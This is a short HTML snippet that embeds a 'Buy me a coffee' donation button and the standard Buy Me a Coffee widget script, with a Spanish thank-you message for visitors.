<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>